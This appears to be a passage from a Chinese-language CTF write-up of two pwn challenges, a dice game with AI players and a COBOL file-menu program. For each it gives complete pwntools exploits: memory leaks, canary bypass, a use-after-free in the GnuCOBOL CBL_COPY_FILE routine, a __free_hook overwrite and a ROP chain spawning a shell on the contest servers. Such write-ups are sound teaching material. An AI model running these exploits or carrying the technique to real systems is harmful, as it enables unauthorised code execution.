- 若不是，则首先判断如果报出的点数和个数分别为`x`，`y + 1`是否正确；若正确则返回，并选择报出`x`，`y + 1`；若不正确，则增大`x`搜索，搜到则返回，没搜到则说明上一个AI报出的`y`正好等于点数为`x`的骰子的个数，于是后面会报出`spot on`。
### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路
1. 首先，利用`get_dice_left`中的任意地址读，将堆上残留的libc address读出来，再将libc中的environ中存放的stack address读出来，再将栈上的canary读出来，这样首先完成了leak。
1. 然后，正式开始游戏前，获取堆上存放的骰子的各个点数对应的个数信息，并根据上一个AI玩家报出的`x`，`y`得出一条让我们自己获得一个额外骰子的机会，即正好再一下轮到我们的时候，报出`spot on`。
1. 由于我们的位置是最后一个玩家的位置，所以符合上面提到的额外骰子的第二种情况，即我们的第六个骰子在真正地检查地时候不会被统计到，与AI存在信息差。
1. 利用这个信息差，比如第六个骰子点数是5，堆上存放的信息显示点数为5的骰子有4个，那么实际上在后面`count_face_cnt`得到的点数为5的骰子个数实际上为3个；只要我们报出`x = 5`以及`y = 4`，下一个AI就一定会报`spot on`，由于`count_face_cnt(5) = 3 != 4`，所以AI判断错误，会失去一个骰子。
1. 但是也存在特殊情况，即上面`x = 5`以及`y = 4`不符合规则，即上面提到的`x1 &gt; x &amp;&amp; y1 &gt;= y || x1 &gt;= x &amp;&amp; y1 &gt; y`，所以无法让AI输，因此退一步，就尽量让下一个AI的后一个AI报出`spot on`（这里让下一个AI报出`spot on`加一个额外的骰子也应该没有问题，输的概率还是更大）。
1. 于是采用上述的策略，我们不断地利用这个溢出的骰子让AI输，直到失去所有的骰子获胜。
1. 后面直接ROP执行`system("/bin/sh")`即可。
### <a class="reference-link" name="exp"></a>exp

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys, os, re

context(arch='amd64', os='linux', log_level='debug')
context(terminal=['gnome-terminal', '--', 'zsh', '-c'])

_proc = os.path.abspath('./liars')
_libc = os.path.abspath('./libc-2.31.so')
libc = ELF(_libc)
elf = ELF(_proc)

p = remote('liars.pwni.ng', 2018)

def leak(offset):
    p.sendlineafter("Leave\n", "1")
    p.sendlineafter("Player? ", str(offset))
    p.recvuntil("They have ")
    val = int(p.recvuntil(" dice", drop=True))
    if val &lt; 0:
        val = (1 &lt;&lt; 32) + val
    return val

def decide_player(num):
    p.sendlineafter("How many players total (4-10)?", str(num))

def show_dice_num(dice_face):
    p.sendlineafter("Leave\n", "1")
    p.sendlineafter("Player? ", str(dice_face))
    p.recvuntil("They have ")
    return int(p.recv(2))

def change_spot(spot):
    p.sendlineafter("Leave\n", "2")
    p.sendlineafter("Which player do you want to switch with?", str(spot))

def start_bet():
    p.sendlineafter("2) Print dice horizontally\n", "1")

def bet(face, cnt, info=True):
    if info == True:
        p.sendlineafter("Leave\n", "0")
    p.sendlineafter("Die face? ", str(face))
    p.sendlineafter("Number of dice? ", str(cnt))

def liar():
    p.sendlineafter("Leave\n", "1")

def check_total():
    p.sendlineafter("Leave\n", "3")
    p.recvuntil("There are ")
    return int(p.recv(1))

def spot():
    p.sendlineafter("3) Leave\n", "2")

def find_a_way(dice_count, now_face, now_cnt):
    path = []
    while True:
        path.append((now_face, now_cnt))
        if now_cnt + 1 &lt;= dice_count[now_face]:
            now_cnt += 1
        else:
            now_face += 1
            while now_face &lt;= 6:
                if now_cnt &lt;= dice_count[now_face]:
                    break
                else:
                    now_face += 1
            if now_face &gt; 6:
                break
    return path

def get_dice_count(total):
    dice_count = [0 for i in range(7)]
    for i in range(-20, -15):
        dice_count[i + 21] = show_dice_num(i)
    dice_count[6] = total - sum(dice_count)
    print total, dice_count
    return  dice_count


def get_extra_die_face():
    p.recvuntil("Your dice:\n")
    buffer = p.recvuntil("Player ")
    die_face = []
    start = 0
    while True:
        try:
            string = buffer[start : start + 0x1E]
            start += 0x1E
            die_face.append(dice.index(string) + 1)
        except:
            break
    return die_face[-1]

dice = [
    "-----\n|   |\n| o |\n|   |\n-----\n",
    "-----\n|o  |\n|   |\n|  o|\n-----\n",
    "-----\n|  o|\n| o |\n|o  |\n-----\n",
    "-----\n|o o|\n|   |\n|o o|\n-----\n",
    "-----\n|o o|\n| o |\n|o o|\n-----\n",
    "-----\n|o o|\n|o o|\n|o o|\n-----\n",
]

# do leak first
decide_player(10)

heap_low_bytes = leak(-0x7E)
heap_high_bytes = leak(-0x7D)
heap_base = ((heap_high_bytes &lt;&lt; 32) | heap_low_bytes) - 0x10

libc_low_bytes = leak(-0x66)
libc_high_bytes = leak(-0x65)
libc_base = ((libc_high_bytes &lt;&lt; 32) | libc_low_bytes) - 0x1ec5c0

libc_environ = libc_base + libc.sym['environ']
offset = (libc_environ - heap_base - 0x4a0) &gt;&gt; 2
offset -= (1 &lt;&lt; 63) # offest should be negative
stack_low_bytes = leak(offset)
stack_high_bytes = leak(offset + 1)
stack_addr = ((stack_high_bytes &lt;&lt; 32) | stack_low_bytes)

canary_addr = stack_addr - 0x5f0
offset = (canary_addr - heap_base - 0x4a0) &gt;&gt; 2
offset -= (1 &lt;&lt; 63) # offest should be negative
canary_low_bytes = leak(offset)
canary_high_bytes = leak(offset + 1)
canary = ((canary_high_bytes &lt;&lt; 32) | canary_low_bytes)

# gadgets address
pop_rdi_rbp = libc_base + 0x00000000000276e9 # pop rdi ; pop rbp ; ret
str_bin_sh = libc_base + libc.search("/bin/sh").next()
system = libc_base + libc.sym['system']

# now let's win the game
while True:
    try:
        p.sendlineafter("4) Leave\n", "4")
        p.sendlineafter("Play again (y/n)?", "y")
        decide_player(5)

        dice_count = get_dice_count(25)

        start_bet()
        p.recvuntil("Player 3's turn\nBet ")
        start = map(int,p.recv(3).split(' '))
        # print(start)

        # predict what the AI will do
        path = find_a_way(dice_count, start[1], start[0])
        # print(path)
        if len(path) &lt; 6 or dice_count[path[-5][0]] == path[-5][1]:
            # Make sure we can gain an extra die by spot on
            # If not, quit and start again
            bet(path[-1][0], path[-1][1])
        else:
            # win one die
            bet(path[-5][0], path[-5][1])
            spot() 
            break
    except:
        continue

# let ai lose one
dice_count = get_dice_count(26) # this is what AI know, but it's wrong

# get what the extra die face is
extra_die_face = get_extra_die_face()
# print(die_face)

# let the next AI spot on, which will let it lose one die
bet(extra_die_face, dice_count[extra_die_face], False)

# let ai lose again
total = 25
flag = False
while True:
    if check_total() == 2:
        break

    dice_count = get_dice_count(total)
    extra_die_face = get_extra_die_face()
    # print(die_face)

    if flag == False:
        p.recvuntil("3's turn\nBet ")
        start = map(int,p.recv(3).split(' '))
        if [dice_count[extra_die_face], extra_die_face] == start:
            # if the last AI is wrong
            liar()
            flag = True
        elif extra_die_face &gt;= start[1] and dice_count[extra_die_face] &gt;= start[0]:
            # just let AI spot on and lose one die
            bet(extra_die_face, dice_count[extra_die_face], True)
        else:
            # unfortunately, we must let one AI win, but we can try not to let the next AI win
            path = find_a_way(dice_count, start[1], start[0])
            # print(path, (extra_die_face, dice_count[extra_die_face]))
            if [path[-1][1], path[-2][0]] != start:
                bet(path[-2][0], path[-2][1], True)
            else:
                bet(path[1][0], path[1][1])
    else:
        bet(extra_die_face, dice_count[extra_die_face], False)
        flag = False

    if "loses" in p.recvuntil("New round"):
        total -= 1
    else:
        total += 1

# only two players left, every round the AI will lose one die
while True:
    dice_count = get_dice_count(total)
    extra_die_face = get_extra_die_face()

    try:
        p.recvuntil("'s turn\nBet ", timeout=0.5)
        start = map(int,p.recv(3).split(' '))
        if start == [dice_count[extra_die_face], extra_die_face]:
            liar()
        else:
            bet(extra_die_face, dice_count[extra_die_face], True)
    except:
        bet(extra_die_face, dice_count[extra_die_face], False)

    p.recvuntil("loses a die.\n")
    if p.recv(19) == "What is your name? ":
        break
    else:
        total -= 1

# ROP now
payload = 'A' * 0x208
payload += p64(canary) + p64(0)
payload += flat([pop_rdi_rbp, str_bin_sh, 0, system])
p.sendline(payload)

success("libc_base: " + hex(libc_base))
success("heap_base: " + hex(heap_base))
success("stack_addr: " + hex(stack_addr))
success("canary: " + hex(canary))

p.interactive()
```



## THE COBOL JOB

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

一个COBOL语言写的程序，实现一个简单的菜单，提供创建、打开、读、写、关闭、复制文件的操作：

```
IDENTIFICATION DIVISION.
PROGRAM-ID. CBLCHALL1.

ENVIRONMENT DIVISION.
INPUT-OUTPUT SECTION.
FILE-CONTROL.
*    SELECT SYSIN ASSIGN TO KEYBOARD ORGANIZATION LINE SEQUENTIAL.

DATA DIVISION.
FILE SECTION.
*FD SYSIN.

WORKING-STORAGE SECTION.
01 itr.
05 J PIC 9(2).
01 looping.
05 opt PIC 9(1).
88 ENDLOOP VALUE HIGH-VALUES.
05 rep PIC A(1).
01 OPT-6.
05 fname61 PIC X(256).
05 fname62 PIC X(256).
01 FILES.
05 fnm PIC X(256).
05 fidx PIC 9(1).
05 foff PIC 9(10) VALUE ZERO BINARY.
05 fnmp PIC X(256) OCCURS 16 TIMES.
05 ffd PIC 9(4) USAGE BINARY OCCURS 16 TIMES.
05 tfd PIC 9(4) USAGE BINARY.
05 fsz PIC 9(4) USAGE BINARY OCCURS 16 TIMES.
05 tsz PIC 9(4) USAGE BINARY.
05 fptr USAGE POINTER OCCURS 16 TIMES.
05 floop PIC 9(1).



PROCEDURE DIVISION.
PERFORM VARYING J FROM 1 BY 1 UNTIL J &gt; 16
   MOVE ZERO TO ffd(J)
   MOVE ZERO TO fsz(J)
END-PERFORM.

PERFORM UNTIL ENDLOOP
   DISPLAY "-----------------------"
   DISPLAY "1 - Create file"
   DISPLAY "2 - Open file"
   DISPLAY "3 - Read file"
   DISPLAY "4 - Write file"
   DISPLAY "5 - Close file"
   DISPLAY "6 - Copy file"
   DISPLAY "7 - Exit"
   DISPLAY "&gt; "
   ACCEPT opt

   IF opt IS EQUAL TO 1 THEN
       DISPLAY "File Name: "
       ACCEPT fnm
       DISPLAY "Index: "
       ACCEPT fidx

       IF (fidx IS &gt;= 1) AND (fidx IS &lt;= 16) THEN
           IF fsz(fidx) EQUAL TO 0 THEN
               DISPLAY "Buf Size: "
               ACCEPT fsz(fidx)

               IF (fsz(fidx) IS EQUAL TO 0) OR
-                        (fsz(fidx) IS &gt;= 4096) THEN
                   SET fsz(fidx) TO 1
               END-IF

               CALL "malloc" USING BY VALUE fsz(fidx)
-                        RETURNING fptr(fidx)

               IF fptr(fidx) NOT EQUAL TO NULL THEN
                   CALL "CBL_CREATE_FILE"
-                            USING fnm 3 3 0 ffd(fidx)
                   IF RETURN-CODE NOT EQUAL TO 0 THEN
                       DISPLAY "failed to create file"
                       CALL "free" USING BY VALUE fptr(fidx)
                       SET ffd(fidx) TO 0
                       SET fsz(fidx) TO 0
                       SET fptr(fidx) TO NULL
                   END-IF
               ELSE
                   DISPLAY "Unable to allocate memory!"
                   SET ENDLOOP TO TRUE
               END-IF

           ELSE
               DISPLAY "Not empty"
           END-IF
       ELSE
           DISPLAY "Bad Input"
       END-IF
   END-IF

   IF opt IS EQUAL TO 2 THEN
       DISPLAY "File Name: "
       ACCEPT fnm
       DISPLAY "Index: "
       ACCEPT fidx

       IF (fidx IS &gt;= 1) AND (fidx IS &lt;= 16) THEN
           IF fsz(fidx) EQUAL TO ZERO THEN
               DISPLAY "Buf Size: "
               ACCEPT fsz(fidx)

               IF (fsz(fidx) IS EQUAL TO 0) OR
-                        (fsz(fidx) IS &gt;= 4096) THEN
                   SET fsz(fidx) TO 1
               END-IF

               CALL "malloc"
-                    USING BY VALUE fsz(fidx) RETURNING fptr(fidx)

               IF fptr(fidx) NOT EQUAL TO NULL THEN
                   CALL "CBL_OPEN_FILE"
-                            USING fnm 3 3 0 ffd(fidx)
                   IF RETURN-CODE NOT EQUAL TO 0 THEN
                       DISPLAY "failed to open file"
                       CALL "free" USING BY VALUE fptr(fidx)
                       SET ffd(fidx) TO 0
                       SET fsz(fidx) TO 0
                       SET fptr(fidx) TO NULL
                   END-IF
               ELSE
                   DISPLAY "Unable to allocate memory!"
                   SET ENDLOOP TO TRUE
               END-IF

           ELSE
               DISPLAY "Not empty"
           END-IF
       ELSE
           DISPLAY "Bad Input"
       END-IF
   END-IF

   IF opt IS EQUAL TO 3 THEN
       DISPLAY "Index: "
       ACCEPT fidx

       IF (fidx IS &gt;= 1) AND (fidx IS &lt;= 16) AND fsz(fidx)
           NOT EQUAL TO ZERO THEN
           SET foff TO ZERO
           SET floop TO 0
           PERFORM UNTIL floop IS EQUAL TO 1
*                    Sketchy code to ensure my fd is right shifted
*                    by a bytes. TODO: If possible, rewrite this
*                    with CBL_READ_FILE
               DIVIDE 256 INTO ffd(fidx) GIVING tfd
               CALL "read"
-                      USING BY VALUE tfd fptr(fidx) fsz(fidx)
                 RETURNING foff
               IF foff IS POSITIVE THEN
                   CALL "write"
                     USING BY VALUE 1 fptr(fidx) fsz(fidx)
                   END-CALL
               ELSE
                   SET floop TO 1
               END-IF
           END-PERFORM
       ELSE
           DISPLAY "Bad Input"
       END-IF
   END-IF

   IF opt is EQUAL TO 4 THEN
       DISPLAY "Index:"
       ACCEPT fidx

       IF (fidx IS &gt;= 1) AND (fidx IS &lt;= 16) AND fsz(fidx)
           NOT EQUAL TO ZERO THEN
           SET foff TO ZERO
           SET floop TO 0
           DISPLAY "Input:"
           PERFORM UNTIL floop IS EQUAL TO 1
               CALL "read"
-                      USING BY VALUE 0 fptr(fidx) fsz(fidx)
                 RETURNING foff
               IF foff IS POSITIVE THEN
                   DIVIDE 256 INTO ffd(fidx) GIVING tfd
                   CALL "write"
                     USING BY VALUE tfd fptr(fidx) foff
                   END-CALL
               ELSE
                   SET floop TO 1
               END-IF

               DISPLAY "Read More (Y/y for yes)"
               ACCEPT rep
               IF rep NOT EQUAL TO "Y" AND
                   rep NOT EQUAL TO "y" THEN
                   SET floop TO 1
               END-IF
           END-PERFORM
       ELSE
           DISPLAY "Bad Input"
       END-IF
   END-IF

   IF opt is EQUAL TO 5 THEN
       DISPLAY "Index: "
       ACCEPT fidx

       IF (fidx IS &gt;= 1) AND (fidx IS &lt;= 16) THEN
           IF ffd(fidx) IS NOT Zero THEN
               CALL "free" USING BY VALUE fptr(fidx)
               CALL "CBL_CLOSE_FILE" USING ffd(fidx)

               SET fsz(fidx) TO 0
               SET ffd(fidx) TO 0
               SET fptr(fidx) TO NULL
           ELSE
               DISPLAY "Bad Input"
           END-IF
       ELSE
           DISPLAY "Bad Input"
       END-IF
   END-IF

   IF opt is EQUAL TO 6 THEN
       DISPLAY "Enter filename1: "
       ACCEPT fname61
       DISPLAY "Enter filename2: "
       ACCEPT fname62
       call "CBL_COPY_FILE" using fname61 fname62
   END-IF

   IF opt is EQUAL TO 7 THEN
       DISPLAY "Bye!!"
       SET ENDLOOP TO TRUE
   END-IF
END-PERFORM
STOP RUN.
```

比较古老的语言了，但是可读性很强，从程序语言本身就能很好地理解它的逻辑了，但是看不出有什么漏洞可以利用。<br>
这里涉及到`CBL_COPY_FILE`的实现了：

```
int
CBL_COPY_FILE (unsigned char *fname1, unsigned char *fname2)
`{`
    char    *fn1;
    char    *fn2;
#ifdef    O_BINARY
    int    flag = O_BINARY;
#else
    int    flag = 0;
#endif
    int    ret;
    int    i;
    int    fd1, fd2;

    COB_CHK_PARMS (CBL_COPY_FILE, 2);

    if (!cob_current_module-&gt;cob_procedure_parameters[0]) `{`
        return -1;
    `}`
    if (!cob_current_module-&gt;cob_procedure_parameters[1]) `{`
        return -1;
    `}`
    fn1 = cob_str_from_fld (cob_current_module-&gt;cob_procedure_parameters[0]);
    flag |= O_RDONLY;
    fd1 = open (fn1, flag, 0);
    if (fd1 &lt; 0) `{`
        free (fn1);
        return -1;
    `}`
    free (fn1);
    fn2 = cob_str_from_fld (cob_current_module-&gt;cob_procedure_parameters[1]);
    flag &amp;= ~O_RDONLY;
    flag |= O_CREAT | O_TRUNC | O_WRONLY;
    fd2 = open (fn2, flag, 0660);
    if (fd2 &lt; 0) `{`
        close (fd1);
        free (fn2);
        return -1;
    `}`
    free (fn2);
    ret = 0;
    while ((i = read (fd1, fn1, sizeof(fn1))) &gt; 0) `{`
        if (write (fd2, fn1, (size_t)i) &lt; 0) `{`
            ret = -1;
            break;
        `}`
    `}`
    close (fd1);
    close (fd2);
    return ret;
`}`
```

有一个比较离谱的UAF，就是`fn1 = cob_str_from_fld (cob_current_module-&gt;cob_procedure_parameters[0]);`，`free (fn1);`，然后又`read (fd1, fn1, sizeof(fn1)))`，简单直白的UAF。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路
1. 由于无法直接调用所给功能去`open("/proc/self/maps)`，这里通过strace跟踪发现，`CBL_OPEN_FILE`最后是`openat(AT_FDCWD, "/proc/self/maps", O_RDWR) = -1 EACCES (Permission denied)`，是打不开的；但是如果通过`CBL_COPY_FILE`的话，底层是`openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) = 3`，是可以直接将`/proc/self/maps`复制到`/dev/stdout`，就能将内容打印到标准输出上，实现leak。
1. 然后利用`CBL_COPY_FILE`里存在的UAF，分配到`__free_hook`，改为`system`即可。
### <a class="reference-link" name="exp"></a>exp

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys, os, re

context(arch='amd64', os='linux', log_level='debug')

_proc = os.path.abspath('./chall')
_libc = os.path.abspath('./libc-2.27.so')

libc = ELF(_libc)
elf = ELF(_proc)

p = remote('cobol.pwni.ng', 3083)

# menu
choose_items = `{`
    "create": 1,
    "open": 2,
    "read": 3,
    "write": 4,
    "close": 5,
    "copy": 6
`}`

def choose(idx):
    p.sendlineafter("&gt; ", str(idx))

def create_file(filename, idx, size):
    choose(choose_items['create'])
    p.sendlineafter("File Name:", filename)
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Buf Size:", str(size))

def open_file(filename, idx, size):
    choose(choose_items['open'])
    p.sendlineafter("File Name:", filename)
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Buf Size:", str(size))

def read_file(idx):
    choose(choose_items['read'])
    p.sendlineafter("Index:", str(idx))

def write_file(idx, content):
    choose(choose_items['write'])
    p.sendlineafter("Index:", str(idx))
    p.sendafter("Input:", content)
    p.sendlineafter("Read More (Y/y for yes)", "n")

def close_file(idx):
    choose(choose_items['close'])
    p.sendlineafter("Index:", str(idx))

def copy_file(src, dst):
    choose(choose_items['copy'])
    p.sendlineafter("Enter filename1: ", src)
    p.sendlineafter("Enter filename2: ", dst)

# leak
copy_file("/proc/self/maps", "/dev/stdout")
for i in range(4):
    p.recvuntil("/lib/x86_64-linux-gnu/libm-2.27.so\n")
libc_base = int(p.recv(12), 16)
__free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

# create two files
create_file("tmpfile1.txt".rjust(0x30, 'A'), 1, 0x38)
create_file("tmpfile2.txt", 2, 0x8)
write_file(1, p64(__free_hook))

# uaf
copy_file("tmpfile1.txt".rjust(0x30, 'A'), "tmpfile2.txt")
create_file("tmpfile3.txt", 3, 0x38)
create_file("tmpfile4.txt", 4, 0x38)
write_file(3, "/bin/sh\x00")
write_file(4, p64(system))

# trigger
close_file(3)

success("libc_base: " + hex(libc_base))

p.interactive()
```
